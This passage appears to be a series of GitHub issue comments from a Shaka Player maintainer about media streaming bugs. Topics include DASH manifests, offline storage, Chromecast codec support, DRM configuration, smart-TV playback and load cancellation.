wait 10 minutes between requests, I don't see the time in the segment timeline advancing. Correct me if I am wrong, but shouldn't the segment timeline be getting updated?. @avelad Thank you for finding this. I have been able to repo this and have a fix ready for review. I hope to have this closed by end of day.. @nocarryr Thanks for finding that. We appreciate the attention to detail.. @londonshliach This is a short coming in our offline solution. The reason you don't see the asset in list is that we store the manifest entry last as we don't have all the segment references until the download is complete. We don't save partial manifests as it would allow someone to play an incomplete manifest and would require hundreds to thousands more db operations.\nWe are working to create a garbage collection system for cases just like this - however it is taking a back seat to the upgrade problems we are working on. There are numerous difficult cases we need to handle with a GC system.\nAs of today (2018-02-05) you have two options that require to code changes:\n1. Delete the whole database (using the application window in the dev console or using Storage exposed delete all method).\n2. Delete each segment using the application window in the dev console (this would be error-prone and painful to do).\nIf you are willing to make some code changes, you can read all the manifests and create a set of all segment ids. Then you can go through all the segments in the database and delete any that don't appear in your set. This is what our GC operation will do, but there are some atomic operation issues we need to sort out before we are willing to release it in the library.\n@londonshliach Does that help?. @chrisfillmore Thank you for the suggestion - I will add that to my list of possible solutions to explore. Right now the greatest challenge we are facing with this issue is how to maintain backward-compatibility while not inhibiting the new designs.. @joeyparrish If I could chime in with an idea for when someone goes to implement this. It may be a good idea if license management is moved out of storage.\nRight now we have a flag for whether or not the storage system needs to download a license and free a license. But if the app was to track this, it could just cache which licenses it needed to free next time it had a network connection. This level of control is not possible in storage.\nIt would also remove the need for storage to have logic about licenses at all. No need to make a request or free them. It just worries about the segments and manifests.. Just a small nit, according to https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function:\njs\n    it('can be used before load()', function() {\n      await player.attach();\n      await player.load('test:sintel_compiled');\n    });\nwill need to be:\njs\n    it('can be used before load()', async function() {\n      await player.attach();\n      await player.load('test:sintel_compiled');\n    });. @avelad Is the content you provided still available? I only get 404 errors when I try to request the content you provided in your original issue post.. @jakubvojacek, you are right, mux.js should not be required. I just spoke with @michellezhuogg and we have a plan to address the issue and she is working on implementing it right now.  Hopefully this won't not be an issue for much longer. . @TobbeEdgeware thank you for your patience with this issue.\nI can reproduce it when I use the commit hash you provided. When I use the current master, I cannot reproduce it. So it looks like it was fixed by another commit.\nCould you try reproducing the issue using the current master. If everything works as you would expect, please feel free to close the issue.. @TobbeEdgeware Thanks. I am going to put the \"waiting on response\" label back on so that our book keeping won't think that we are ignoring the issue.. Thanks @TobbeEdgeware for checking.. Just to give everyone an update, we have reached 32% completion for v2.5. If you would like to follow the progress more directly, you can check it out here.. It is hard for me to say. Right now Joey and I are working on a design for a large change to the load system that is needed to make src= work cleanly. I am hoping that once the design is done and I can move onto implementation that I will be able to make substantial progress on #816.. @sergioavazquez I have dug into this a little bit for you as @joeyparrish passed this onto me.\nIt looks like you can add a chrome.cast.media.GenericMediaMetadata to chrome.cast.media.MediaInfo as part of  shaka.cast.CastReceiver.prototype.sendMediaInfoMessage_ in lib/cast/cast_receiver.js.\nAs per the documentation it appears you can add it under the metadata field that we currently leave undefined. Once set, the cast receiver should take care of sending it back to the client.\nDoes this answer your question?. We don't have support for that feature right now, nor do we have an official way in the library to inject it. If you were to add support for it, we are always welcoming to pull requests and would be happy to evaluate the pull request and add it to the project.. @Feenposhleen I think I understand the scenario you're explaining.\nSince all the segments are still available, it is possible to convert the live manifest to a VOD manifest and Shaka Player does support this transition .\n@kqyang from the Shaka Packager team talks about the attributes that need to change in the manifest to allow this in this issue.\nSo when your live stream ends, the server can update the manifest to be VOD and when the player fetches the updated copy it should switch from playing the live stream to the VOD stream automatically.\n@joeyparrish Did I miss anything?. @kuznetcoff777 Thank you for your patiences. Right now @joeyparrish is working on #999. While the initial approach was a larger-scaled solution (addressing many other problems), he is now working on identifying a smaller scale-scale solution that would resolve #999 in a smaller time window and then later bring in the larger-scale solution.\nLast I talked with him, a strategy for this is still being developed as it #999 has been a difficult problem to navigate. Going forward I would suggest following #999 as it will allow you to get more direct updates on the progress.\nIf following #999 resolves all your needs, please feel free to close this issue.. @srstrong Thanks for bringing this up. I am going to bring-in @kqyang as he is one of the resident experts on the Dash spec. @kqyang, would you be able to comment on @srstrong 's understanding of the spec and the additional AdaptationSet approach?\nOnce we know that everyone has the same understanding of what the spec allows, we can look into how best to approach this in the Shaka Player code.. @srstrong Does that answer your question? If so, please feel free to close the issue.. @warking Could you provide me with some clarification?\nWhen you say \"max to only 720p resolution ... while playback in the browser, 1080p can be selected to play.\" are you saying:\n- that when you play on the ChromeCast, the max resolution you can manually select is 720p and when you play in a browser (not casting) the max resolution you can manually select is 1080p?\n- OR that when you play on the ChromeCast, the max resolution that gets played is 720p and when you play in a browser (not casting) the max resolution that gets played is 1080p? \n- OR that when you play on the ChromeCast, the max resolution that gets played is 720p and when you play in a browser (not casting) the max resolution you can manually select is 1080p?. @warking I have been able to reproduce your issue and will start looking into it for you.. @warking, after some digging this is what I found. I hope it helps.\nInside the dash parser we call to the player interface's filterAllPeriods which will go through all the variants and will check if the variant is compatible with the platform. If you follow the call chain deep enough you will find a call to MediaSource.isTypeSupported.\nThis is where we ask media source if it can handle the content. Now on Chromecast we had to polyfill it as some codecs (while playable) cause problems if they are in the codec string. I checked and nothing in the pollyfill modifies your content\u2019s mime type - so it's not a problem there.\nHowever, when I started playing with cast.__platform__.canDisplayType, which the polyfill uses to test compatibility, I found that what it didn\u2019t like was the avc1.640032 codec. To make sure this was not a false rejection, I forced it to return true and media source threw an error because it could not handle the content.\nSo it appears that there is something about the avc1.640032 codec that prevents the chromecast from playing that video stream. Thankfully Shaka Player detects it ahead of time and removes all variants that would use it.. Does that help?. @warking, our Lab is only set-up with a Chromecast Ultra, so all my original testing was with a Chromecast Ultra. The 1080p tracks do not appear because window.cast.__platform__.canDisplayType returns false when given 'video/mp4; codecs=\"avc1.640032\";'.. @tmagnien does @TheModMaker instructions fix your problem?. @mjaddani If I understand correctly, you are looking for a way to track device ids for Chrome and Firefox. Are you looking to track this in the license requests?\nWhen you say \"Widevine advised me to activate these 2 attributes\", where did you get that instruction from?. So Shaka Player is part of Widevine - who in Widevine have you been talking to? We can touch base with them to figure out both ends of this issue because I suspect most of this is license based as the player has no actual control over the CDM. . I have reached out to Prashant Grover and will figure out what he is suggesting you do. I will assign this to myself so that we don't lose track of it.. After talking this over with Prashant, he said his original instructions would have been:\n- Specify Provider Client Token on your proxy.\n- Set distinctiveIdentifierRequired and persistentStateRequired in the player.\nAs you pointed out,\n\nprovider_client_token is only supported in the Chrome CDM and persistentState must be enabled by the Application.\n\nFor distinctive identifier to work, the CDM must be willing to provide one, that is why we query for it. If the configuration cannot be fulfilled (REQUESTED_KEY_SYSTEM_CONFIG_UNAVAILABLE) there is nothing we can do, the EME specs even say,\n\nImplementations that use Distinctive Identifier(s) or Distinctive Permanent Identifier(s) should support the option to not use them.\n\nAnd it even recomends against their use (source).\nSo @mjaddani, with all that said, unless a platform is willing to give you distinctive identifiers, there is no way to force it.. It looks like this was addressed in a previous change. The circular dependency between StreamUtils and DrmEngine no longer exists. Currently the only connection between StreamUtils and DrmEngine is in StreamUtils.filterNewPeriod.. @fadomire I'll want @joeyparrish to chime in on this suggestion, but what we could do is replace minBufferTime: number with resolveMinBufferTime:function(?number). With this, the app could replace the logic that determines what min buffer time to use (using the manifest provided value as a guiding principle).\nFrom the manifest parser they would then have a callback usable as:\n// When the manifest does not have their own value.\nconst minBufferTime = this.config_.resolveMinBufferTime(null);\nand\n// When the manifest has their own value.\nconst minBufferTime = this.config_.resolveMinBufferTime(this.mySuggestedMinBufferTime);\nThe library could provide a default like:\n(manifestMinBufferTime) => {\n  const myDefault = /* some number */;\n  return manifestMinBufferTime ? Math.max(manifestMinBufferTime, myDefault) : myDefault;\n};\nThen apps could replace it further with whatever logic they need/want.\n. We'll re-open the issue while we figure out if it's a separate issue. This issue was more about a regression during a encrypted to clear transition.\n@SemihGk if I understand correctly, you are now asking about the reverse (the clear to encrypted transition). Right now media source does not support codec switching, so the content would still need to have the same codec (that would be filtered outside of DrmEngine). So is the problem that the codec stays the same but the profile changes causing us to reject it?. @SemihGk , this case came up in a conversation with @joeyparrish yesterday. He is out of the office until next Friday, but I will sync-up with him again once here is back and we will figure out how we want to approach this issue (we came up with 5 or 6 different cases so it gets messy fast).\nI will assign this to myself so that it won't fall between the cracks.. @SemihGk @joeyparrish , Just so you both know, I have been following along. Will follow through on @joeyparrish recommended approach.. @SemihGk Good new, I am already looking through the load chain code for work with #816. If this issue is not causing any major issues for you or your users, would you be willing to wait until I make more progress on #816 where then we can re-evaulate whether this is still an issue after more of that work is complete?. Shaka Player is limited to what the platform (the browser) supports. This means if Chrome/Firefox/Edge do not support a feature, we cannot play that content on that browser. The one exception is if it is something at the manifest-level (which we parse). If Chrome does not support it, there is not much we can do.. @joeyparrish Could you take a look at this one?\nIt is very interesting in that if you seek to \"live\" it sits into the buffering state until it falls back far enough and starts playing. However you don't need to wait as if you seek backwards far enough it will start playing again. . So @joeyparrish, if I understand you correctly: drift is still possible when SegmentTemplate and duration are used? If so then I believe that is exactly what's happening because in the manifest we have entries that look like:\n<SegmentTimeline>\n  <S t=\"5216257200\" d=\"288000\" r=\"4688\"/>\n</SegmentTimeline>\nand\n<SegmentTimeline>\n  <S t=\"5216385840\" d=\"288000\" r=\"942\"/>\n  <S t=\"5487969840\" d=\"291090\"/>\n  <S t=\"5488257840\" d=\"288000\" r=\"3744\"/>\n</SegmentTimeline>. I went back and double check with with the 2.5 beta demo and it appears to be working (I swear I checked that). However it does struggle to keep at the live edge without buffering.\n@jakubvojacek Could you check using the 2.5 beta demo and see if you get the behaviour you want? I had no issues when I tried it today.. @suchitht The manifest URLs you provided are local to you. We cannot use those to reproduce the issue.\nBased on the information you have provided, Error 1002 is a HTTP error (source). However with out a way to reproduce your issue there is not much I can tell you.\nWhat I can suggest is:\n1. Host the content where we can access it.\n2. Try packaging the content without encryption to test if your setup is functioning as expected. If you can package the same content in the clear and play it back, then it means there is something wrong when you try to encrypt, but at least the scope of the problem has been narrowed down.. As for surfacing that information, I don't see any problems (@joeyparrish will have final say).\nI am concerned with the numerous functions we have on the top-level player api so adding getLiveEdge to it worries me. \nRight now we have some functions (2 to be exact) that extract read-only values from the timeline. If we had a read-only interface for the timeline, we could just return a readonly version of it and then we could drop multiple functions from the player interfaces with just getTimeline.\n@joeyparrish What do you think of that idea?\n@chrisfillmore What do you think of that idea?. We already allow someone to implement their own storage mechanism. With that you should be able to plug-in an alternative back-end to store the content.. How/Should this affect filtering?. I only just started looking into this...\nMy high-level findings so far:\n - The difference between 2.4 and 2.5 is in what Playhead is saying our start time is.\nLow-level findings:\n - Playhead gets the start time from PresentationTimeline\n - PresentationTimeline determines the start time from minSegmentStartTime_\n - minSegmentStartTime_ which is updated from notifySegments\n - notifySegments is called via SegmentList/SegmentTemplate/SegmentBase by DashParser\nA more accurate problem statement:\n - SegmentTemplate is not updating minSegmentStartTime_ when the segments have a known duration\nI will sync-up with the Shaka Player team internally to determine next steps.. Thank you @bgimmig for finding this.\nI was not able to get your content playing (license issues) but I was able to reproduce a failure to continue playback with the local player when casting our \"Angel One\" content. Moving this issue to the BUG label.. @pineapplejoe next time, please use the issue template provide when creating a new issue. It will help us ensure that we have all the information we need to help you resolve your issues.\nI have included below the issue template for to use for this issue. I would also ask that you include some way for our to reproduce what you are seeing.\nThanks!\nHave you read the FAQ and checked for duplicate open issues?:\nWhat version of Shaka Player are you using?:\nCan you reproduce the issue with our latest release version?:\nCan you reproduce the issue with the latest code from master?:\nAre you using the demo app or your own custom app?:\nIf custom app, can you reproduce the issue using our demo app?:\nWhat browser and OS are you using?:\nWhat are the manifest and license server URIs?:\nYou can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest.  A copy of the manifest text or an attached manifest will not be enough to reproduce your issue, and we will ask you to send a URI instead.  You can copy the URI of the demo app to send us the exact asset, licence server, and settings you have selected there.\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?. @krvangala Could you elaborate on what you are looking to do? We will be able to provide more specific guidance if you know what use case you are looking to implement as I am not clear on some of the terms you are using (e.g. \"buffer level\").\nHere is a board explanation of what is happening in Shaka Player:\n1. ABR Manager picks which streams should be streamed based on the current network bandwidth by telling Streaming Engine what streams to download.\n2. Streaming Engine fetches segments using NetworkingEngine and pushes them to Media Source Engine.\n3. Media Source Engine manages Media Source and appends and removes buffers from Media Source.. @krvangala I am glad you found what will work for you. I am going to close the issue.. Right now when we see unencrypted content, we attempt to negotiate key system access for all the common key systems. That way eme is already set up when encrypted data arrives. This works most of the time as long as the codecs don't change - which is what #1567 is about.\nIf we successfully negotiated access to a key system, we pass all content (even unecrypted content) through EME so that if it become encrypted we are still able to play it. If we could not negotiate access, then we play the content with out EME and will crash if it becomes encrypted again later.\nRight now the code for this is in DrmEngine.queryMediaKeys. We realize that part of the code is not the easiest the read and I am personally exploring different ways to structure it so that it will be easier to read in the future.\nWe are currently working on ways to better support scenarios like #1567. Needless to say it is a very complex issue and is something that @joeyparrish and I are actively talking about ways to handle this.\nDoes that help?. @bansalvks, as @chrisfillmore suggested, you can follow our license wrapping tutorial which will walk you through registering request and response filters.\nRequest and response filters will allow you to intercept the request and modify it as you described without the player needing to know anything.\nDoes that answer your question? . @bgimmig Right now there is no generic message support exposed to the app.\nThe way things are implemented right now, CastSender is responsible for sending messages to CastReceiver. By adding methods to CastSender, you can use its sendMessage_ to send messages to the receiver.\nHowever, I do see this as something that we would be willing to consider as an enhancement. If this is something you need. I would suggest opening a new issue requesting it as an enhancement.\nIf you choose to open a new issue for an enhancement, I ask that you include a description of the problem you are trying to solve / the use-case you are trying to support in your app. This way, we can be more informed when it comes to designing the enhancement.\nDoes this help?. @gigon When I try your content, it plays without issue. Now I noticed that in the content your provided the cert path was different from the cert you sent us. After fixing that, everything played without issue on master.. The reason why we store licenseServerUri is that it's possible that someone is not storing an offline license when downloading content, but planning to fetch the license when they go to play it (we call it the train scenario internally).\nIf this is something that is blocking you right now, you can store additional information alongside your asset using the metadata field.\nWe already have some internal conversations about larger changes to the storage system, so I will label this issue as an enhancement request and will bring it up during our design discussions.. @TheModMaker has updated our scripts to be Python2.7 and Python3 compatible, thanks Jacob! We have also vetting all our script and they all already use #!/usr/bin/env. So we should be good to go.. The build bot says its good.\n@TheModMaker  it looks like you had the most substantial concerns. If you are good with this, I think it is safe to accept it and then we can address any minor issues ourselves.. Just to add onto what @joeyparrish commented. Based on the current state of the code the second option for attaching to the video element is recommended. However to add something that is missing from the code snippet, keep in mind that both attach and load are async.\n```\nconst player = new shaka.Player();\n//  ... some time later ...\nconst video = document.getElementById('my-video-element');\nawait player.attach(video);\n//  ... some time later ...\nawait player.load(someManifestUri);. @BlessingD are you configuring the player yourself? If so, could you post the configuration you are passing the player?. Just submitted the fix, should be up on the nightly soon.. @alexgerv I am sorry that progress on this issue has been dormant for so long.\nI noticed that you mentioned in your last comment that stall detection is kicking too fast. As part of Issue #1839 we are making the stall detection logic configurable. Would that help you make progress until we find time to investigate gaps and stalls more carefully?\nIn offline converstaions, @joeyparrish and I have talked about how buffering, gap detection, and stall detection may need to be more cooperative, which would be in-line with your idea of grace periods. I'm confident that we'll find a solution that will work for you and others, but we will need time.\nWhat may help this issue get more attention and slotted for a milestone is if you were to summarize what behaviors you need and open an enhancement request. Enhancement requests are easier for community members to rally behind, increasing their priority, and increasing the odds that they'll get resources directed to them.. @avelad Do you have a way for us to reproduce this? Also, when you say \n\n... call to load multiples times\n\nCould you clarify what you mean? Do you mean, you call load multiple times before the previous load request resolves? Or do you mean you call load, wait for it to resolve, then call load again?. @avelad I looking into this right now. I have an idea what could be the problem, but since the compiled version was used, all I have is a class and function. Any chance you could run the uncompliled version? We would get a meaningful line number.. Thank you @avelad, that will help a lot.. @avelad I have a change in review to address the \"Cannot read property 'catch' of undefined\" part, once that has been submitted I will ping you and ask that you try master to see if it resolves the issue.\nThank you for being so patient and cooperative through this.. @avelad Could you try running your tests again with master and uncompiled mode? I am hoping that we won't see \"Cannot read property 'catch' of undefined\".. Shaka Error DRM.FAILED_TO_CREATE_CDM to create DrmEngine is only thrown when we fail to initial the DrmEngine engine. As quoted from the error codes: \n\nThe browser found one of the requested key systems, but it failed to create an instance of the CDM for some unknown reason. error.data[0] is an error message string from the browser. \n\nFromdata[0] we can see that the CDM is saying Failed to initialize CDM. (0). But that is only meaningful to the CDM being used.\nSince all I did was change how DrmEngine destroys itself, I have a feeling what was happening before was a race condition that we have now forced to happen synchronously.\nSome questions to help me figure out what to do next:\n\nWhat asset are you using? Are you using a custom asset or one of our demo assets?\nHave you been able to reproduce this on any other platforms? . @avelad I will need a clarification. You have said:\n\n\nI could play an encrypted video and then it failed. Now it fails with the first video.\n\nand\n\nwith WebOS 3.5 (often) and Tizen 3 (rarely)\n\nI am having a hard time understanding how these two statements work together. Could you explain in a very specific step-by-step manner what you are doing and what you are seeing?. This came from a change I made. I changed getAudioLanguageAndRoles to work on the tracks, instead of streams. I will address it. . This should be fixed now. @jakubvojacek could you verify on your end that this has in-fact resolved your issue and report back to us?. Okay, I will close this one for now. If it is still an issue after #1404 is resolved, please re-open this issue.. @marcbaechinger Thanks for asking! Right now, we don't have an immediate way for the app to listen for a manifest update. In 2.6 we are planning to look at changing how manifest updates work, which would be a great time for us to add this for you.\nTo help us better understand your use case, do you need to know:\n1. when we got a new copy of the manifest (regardless of whether any content actually changed) or\n2. when we got a new copy of the manifest and the contents of the manifest changed\nThe former will be far easier for us to handle and most of the time the content would have changed. The later will be much harder because the parser will have the content needed to merge the manifests, but requiring them to fire events adds an extra cost to implementing custom parsers.. @Kogoruhn since you and @avelad both see this as similar to #1704 I am going to label in the same way. However like in #1704, I am not sure how much we will be able to do since we are not well set-up to test smart tvs.\nIn the meantime, I would encourage you to contribute to the conversation in the #1753 which is about exploring ways that we can all work together to better investigate SmartTV issues.. @avelad, to my understanding, we can't use service works in the Player library.\nWe have one with the demo, but not in the library. My understanding (which could be out-of-date) is an app can only have one service worker, so if we were to add one in the library, it would conflict with the application.\nWhat is the goal of moving transmuxing?. @avelad Thank you for providing the additional information, that looks very interesting and useful in more than one space. Adopting this sounds like it would be a shift in architecture. Decisions like this are above my level, @joeyparrish, what are your thoughts on this?. @amity177 Please fill in the issue template.. @amity177 Please fill in the issue template.. @amity177 Please fill in the issue template.. @chovy Did you provide us with the manifest url as @TheModMaker requested? I am looking through our records and I can't find an email that reference this issue. Would you be willing to send it again and put the issue number in the subject for us?. The problem was that our assert's condition was inverted. It would fail on the first (and only) call to init. init is called when we load the player's javascript, so it did not fail any tests because it was before any tests ran.. @pawelgliwinski Did you send the manifest(s)? I was looking through our records and I can't find an email for this issue. Could you send them again and reference the issue number in the subject line?\nCould you also check if this is happening with our demo app? It will be hard to help if we don't have a reliable way to reproduce the issue.. @pawelgliwinski Thank you. I just saw it arrive in our shared email. However since you sent the actual manifest we won't be able to reproduce the issue, only evaluate the contents of the manifest.\nI should I have been more special, that is my fault. Is this stream hosted anywhere? If you send us the link to where it is hosted we can try to repro this with our Tizen TV.. @ababin could you fill in the issue template? It will ensure we have all the information we normally need before looking into the issue. To make it easier on you, I have inserted the template below:\n NOTE: For bugs, if you delete this template, we will send it again and ask you to fill it out. \nHave you read the FAQ and checked for duplicate open issues?:\nWhat version of Shaka Player are you using?:\nCan you reproduce the issue with our latest release version?:\nCan you reproduce the issue with the latest code from master?:\nAre you using the demo app or your own custom app?:\nIf custom app, can you reproduce the issue using our demo app?:\nWhat browser and OS are you using?:\nWhat are the manifest and license server URIs?:\n NOTE:\n  You can send the URIs to <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#115;&#104;&#97;&#107;&#97;&#45;&#112;&#108;&#97;&#121;&#101;&#114;&#45;&#105;&#115;&#115;&#117;&#101;&#115;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#46;&#99;&#111;&#109;\">&#115;&#104;&#97;&#107;&#97;&#45;&#112;&#108;&#97;&#121;&#101;&#114;&#45;&#105;&#115;&#115;&#117;&#101;&#115;&#64;&#103;&#111;&#111;&#103;&#108;&#101;&#46;&#99;&#111;&#109;</a> instead,\n  but please use GitHub and the template for the rest.\n  A copy of the manifest text or an attached manifest will **not** be\n  enough to reproduce your issue, and we **will** ask you to send a\n  URI instead.  You can copy the URI of the demo app to send us the\n  exact asset, licence server, and settings you have selected there.\n\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?\n. @gdub01 if for some reason your situation is too unique for us to universally support, there is some guidance I can offer on how you can add support for other languages in the library and UI with relatively ease.\nIn the player, we normalize all language codes using a map in shaka.util.LanguageUtils. If you want to standardize your language codes, the conversions will need to be in there. We normalize language codes so that we can be as consistent as possible - this will be important later. In the case that we cannot normalize them, we use them as provided.\nIn the UI, we use display names from  mozilla.LanguageMapping. The choice to use the native name was to make it more accessible to the native speaker - for those who English won't make sense (Si je parle fran\u00e7ais, \"francais\" signifie plus pour moi que \"french\"). We take the normalized language from the player (this is why the normalization was important) and convert them to display names in the UI. \nIf you add your language codes to the map in shaka.util.LanguageUtils and display names to the map in mozilla.LanguageMapping, you should get the behaviour you are asking for.\n@gdub01, does that help?. @Kogoruhn are you able to reproduce this with our host 2.5-beta2 app (link). I am trying to reproduce it on my workstation and I am not seeing the behavior you are describing.. @Kogoruhn I believe I am now seeing what you are talking about using:\n\nShaka Player 2.5-beta2\nChrome 71.0.3578.98\u00a0(Official Build)\u00a0(64-bit)\nLinux\n\nI saw our stall detection logic firing. Out of curiosity, I forces it to wait even longer before kicking in. Doing this, the video was able to resume without stall detection's intervention, but remained in a stall for longer.\nWhen looking at the \"Jumping forward...\" behaviour, it appears that the seek window is only 3 seconds. That is pretty small. The player keeps falling behind and needing to jump forward. Every now and then, the player gets too far ahead which causes a visual stall. I played with how the player handles falling behind and getting ahead, but in the end a 3 second window looks like it is too small for the player.\nThe player is doing its best to play the content, but it appears that a 3 second seek window may be too small.\nTo make sure what I found is accurate, I will have @joeyparrish look at what I found.\n. That is a great question @chrisfillmore, thanks for the help! @avelad do you know what codecs your content is trying to use?. @chrisfillmore do you know if any of those codec normally cause issues with the Tizen media stack?\n@avelad sorry for the delay in catching this, I should have followed-up on this sooner.. @avelad To help understand Tizen's support for VP9 and Opus, what does Tizen do when those codecs are provided to the media stack via src=?. So it sounds like the media stack does not have any issues with the container+codecs. The next question is, \"what is different when we use media source to play the content?\".\nRegardless of if it's a good assumption, I am assuming the content (https://storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd) is not the problem since we use it everywhere.\nWhat I want to look at next is, what happens if we only play one streams (only-audio then only-video) with media source. To help isolate the points of failure, I think it would be best to use a stripped-down media source example.\nI will create the test case and reply with it so that @avelad can test which streams fail. If one of the streams fail with the same error, we will have a much more accurate understand of what is involved with the failure. If we can't reproduce the error, than it means that it is more than just a problem with media source on Tizen.\n@avelad, what are your thoughts?. @avelad How did you conduct your tests? I want to make sure I understand correctly because with it sounds like:\nPLAYBACK METHOD | VIDEO CODEC | AUDIO CODEC | RESULT\n----------------+-------------+-------------+-------\nMSE             | VP9         | opus        | FAIL\nSRC=            | VP9         | opus        | PASS\nMSE             | VP9         | vorbis      | PASS. @macoybarayan The PR for #1600 has not been accepted, nor does it appear to be ready to be accepted. There are comments from both me and @TheModMaker and merge conflicts that need to be resolved first.. @macoybarayan Pull requests are worked on at the pace of the contributor. If you would like to follow their progress, I would suggest following issue #1531 and pull request #1600.. In previous talks there has been a lot of push back for sharing networking engine between players (#1500), but @theodab and I were working on a design to make it easier to purposely share resources between players.\nIf we mostly care about the bandwidth calculations, sharing the networking estimator instance would achieve that while not requiring everyone to use the same networking engine. It would also make it easier for app developers to swap out the estimation logic while not having to change much else (something that I know you @TheModMaker have always been in favor of).\nFor modeling bandwidth when we have concurrent downloads, we could look at updating the bandwidth estimator interface to mark the start and end of a download. That way it would know about overlapping regions and the implementation will have the option to model that differently.. @joeyparrish you raise some very interesting points and it makes me wonder if we lost sight of something, what is the purpose of bandwidth estimation in our player? Is it about effectively modeling and predicting the efficiency of our network connection or is it merely an implementation detail for how we pick which variant to play?. @avelad Thanks for asking. We currently do not have a \"store-as-you-play\" system. Doing something like this would require large changes in our architecture since the player is designed to know nothing about storage.\nIf this is something you feel is important, I would suggest opening a feature request with a full explanation of what you need and how you envision it working. If enough other people express interest in the feature, then @joeyparrish will look at when/where it would fit into our long-term strategy.. @kevinscroggins-youi thank you again for providing an example via JSFiddle.\nThe source of your problem is that you are using \"text/webvtt\" but our parse is registered under \"text/vtt\". If you change the mime type to \"text/vtt\" it works (edited JSFiddle).\nOnce you have a chance to verify it, please feel free to close the issue.. @kevinscroggins-youi Thank you for providing sample code with JSFiddle. When people are as considerate as you and do that, it makes it much easier for us to reproduce.\nUnfortunately when I tried to run it, the player gets a different error Failed to load resource: the server responded with a status of 403 (Forbidden). By chance, is the asset still available?. @kevinscroggins-youi We will need the content hosted or else won't be able to reproduce the issue.. @chrisfillmore thank-you for taking a look at that for us.\nWhat you found makes sense to me, and would explain the issue. Currently release 2.7 is being scoped to focus on HLS work, @joeyparrish does Raw AAC + HLS sound like a likely candidate to be included in 2.7?. Hello @marcbaechinger, My response was getting long, so I have broken it up in sections for you.\nAnswer To Questions\n\nAm I required to cancel a pending load() in any other ways then calling load() again or calling unload()?\n\nYou are not required to call anything to cancel an in-progress load before calling load or unload. We are suppose to do that for you. However multiple close calls to load is not something I would suggest you do (more on that below).\n\nAm I required to wait for promises of load()/unload() to either being resolved or rejected before calling load()/unload() again?\n\nYou are not required to wait for load or unload to finish before calling load or unload again. However, with multiple very close calls to load or unload, I do not suggest doing that (more on that below).\nBackground\nThe OPERATION_ABORTED error is an error thrown mainly by our AbortableOperation class. The main user of this class right now is NetworkingEngine. However, because of the stack trace, I can't actually see who is aborting the AbortableOperation in their destroy method.\nFor Us To Investigate\nIn order for us to investigate it further, can you provide us with a similar stress test to what you have so that we can reliably reproduce this issue?\nFinal Recommendations\nIn the short-term, I would really suggest using unload to cancel the current in-progress call to load and wait for that promise to resolve. Doing that will allow your code to be far more deterministic. \nIn the long-term, the work being done for #816 will add more structure and determinism to the load system, so that should help avoid some of the problems you are seeing.. You can send us a link privately via shaka-player-issues@google.com. To make it easier for us to connect the email with this issue, please ensure that the issue number is in the subject line.\nYou should not see the AssertionError out of load because load is the only function that will check the error and assert that it is shaka.util.Error and assert when its not. So really it is a question about why are we seeing a non-shaka error during the load process.\nOnce we can execute the stress test, I will drill into why we are seeing these two errors (OPERATION_ABORTED and AssertionError) and ensure they are resolved. The main area of my work these days is with the loading system, and I want to make sure it is as stable as possible, so ensuring you feel confident with what happens when a load fails, it a top priority of mine.. I am marking this as \"waiting on response\" while we wait to receive your email.. Thanks for the email @marcbaechinger I have a better idea of what's happening now. It appears that when we destroy the HLS parser (and therefore cancel pending networking requests) the HLS parser thinks we have no partial HLS segment support.\nAside for the rapid load and unload usages, I think the errors found with them are all focused with shaka.hls.HlsPlayer.\nWhat I suggest is that we open another issue to focus on the errors in shaka.hls.HlsPlayer, specially that it treats aborted networking request as the server failing segment requests. Having the separate issue will allow the conversation to be far more focused there and make it more discoverable by others.\n@marcbaechinger, what are your thoughts on that?. @marcbaechinger Are you okay with closing this issue since the core issues will be resolved with #1788 and #816?. @rameshnavi I have taken a quick look into this and it looks (aside from what @ismena pointed out) there is a problem on our end.\nIt appears that the fast forward factory is never added to the controls (at least when we load your sample). To verify this, you can watch shaka.ui.Controls.registerElement and see that we are not registering anything for the \"fast_forward\" key.. After talking it over with @joeyparrish the current plan of action is:\nFor 2.5:\n1. Create a unit test for the HLS parser to show this behaviour. This test will be used as a regression test once the fix is created.\n2. Implement a short-term (less invasive change) that will allow the test mentioned above to pass.\nFor 2.7\n1. As part of the greater HLS changes, this fix should be built into the design of the parser in a more sustainable way than was done for 2.5.. Updates on this issue:\n- A test for reproducing the issue has been created. The test is in code review.\n- A fix for the issue has been created. The fix is in code review.\nMany members of the team have been out-of-office lately, so reviews have been taking longer than normal. Thank you to everyone for their patience.. We have completed all the work for 2.5. The only work remaining is the work listed for 2.7. I am going to remove this from the 2.5 milestone so that it does not block the release. When we scope out 2.7 it should be added to that milestone.\n@joeyparrish I am tagging you here since this has to do with release planning for 2.5 and 2.7.. @mseeley Most HLS content starts at 10 seconds, this is something that Apple's HLS packager does and so a lot of content starts at 10 seconds.\nIs the player:\n - skipping the first 10 seconds of your content\nor is the player:\n - saying your contents at timer=10 seconds and no actual content was skipped . @joeyparrish was #1602 cherry-picked into 2.4 (I don't see it in the changelog)? If not, is there any way to flag it to be cherry-picked in the future?. @legrengo \"refactoring\" is the term for when the implementation of a behaviour is changed without changing the behaviour. Unfortunately while changing how we implemented something, we changed the behaviour.\nAs @theodab said, he submitted a fix to restore the correct behaviour while still maintaining the new implementation. It was committed in do2759b. If you checkout that version, you should see the correct behaviour restored.\nAs a favor to us, could you checkout HEAD or do2759b and tell us if the behaviour you expected has been restored? If so, we can close the issue.. Thanks for filing the issue @marcbaechinger, thankfully we are a little ahead of you. This issues has been resolved as of commit df3926916e791a95863b86fb423de35724e439ae.\nWe will be converting all factories to not use new in our up-coming 2.6 release. After which the chance for issues like this should go away.. @marcbaechinger You should already see it in master (Submitted Feb 20th). Whether there will be another 2.5 beta release, that is up to @joeyparrish but we are closing in on the src= work, so a full 2.5 release should be with-in sight soon.. From a technical stand-point, this looks good, but there are some structural changes I would like, but I want @joeyparrish to chime in:\n- Could the check for WebOS be in the callback passed into |onStall|? That way the core code of StallDetector won't have platform-specific code.\n- Could we have some more documentation around why we are not reacting to stalls on WebOs?\n- Long term, @joeyparrish would it make sense to have StallDetector be an optional component that would only be initialized if we are on a platform that should react to stalls. \n@avelad Could you offer me some feedback? The files you changed were created from some recent refactoring in which I move the stall detector 